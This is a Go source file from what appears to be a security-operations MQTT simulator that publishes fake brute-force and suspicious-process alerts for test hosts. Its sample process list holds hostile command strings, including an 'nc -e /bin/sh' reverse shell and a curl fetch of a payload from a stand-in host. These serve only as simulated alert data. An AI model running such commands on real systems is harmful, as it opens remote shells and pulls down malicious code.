package publishers

import (
	"context"
	"fmt"
	"log"
	"math/rand"

	"soc-mqtt-simulator/backend/models"
	socmqtt "soc-mqtt-simulator/backend/mqtt"
)

func StartHost(ctx context.Context, brokerURL string) error {
	agent := Agent{
		Name:        "host",
		ClientID:    "publisher-host-agent",
		StatusTopic: socmqtt.TopicHostStatus,
		BrokerURL:   brokerURL,
	}
	client, err := agent.connect()
	if err != nil {
		return err
	}
	go client.Wait(ctx)

	go func() {
		log.Printf("[publisher:host] started")
		hosts := []string{"server-01", "server-02", "workstation-01"}
		processes := []string{"nc -e /bin/sh", "curl suspicious.tld/payload", "powershell encoded command", "miner-daemon"}

		for randomInterval(ctx, 2, 4) {
			host := hosts[rand.Intn(len(hosts))]
			if rand.Intn(100) < 55 {
				publishEvent(client, fmt.Sprintf(socmqtt.TopicHostAuthPattern, host), socmqtt.QoSAtLeastOnce, false, EventPayload{
					Type:        models.BruteForce,
					Severity:    models.Medium,
					SourceIP:    randomIP(),
					DestIP:      randomPrivateIP(),
					Port:        22,
					Description: "Failed login burst detected on host",
					Agent:       "host",
					Hostname:    host,
				})
				continue
			}

			publishEvent(client, fmt.Sprintf(socmqtt.TopicHostProcessPattern, host), socmqtt.QoSAtMostOnce, false, EventPayload{
				Type:        models.Malware,
				Severity:    models.High,
				SourceIP:    randomPrivateIP(),
				DestIP:      randomIP(),
				Port:        randomPort(),
				Description: "Suspicious process execution detected",
				Agent:       "host",
				Hostname:    host,
				Process:     processes[rand.Intn(len(processes))],
			})
		}
	}()

	return nil
}
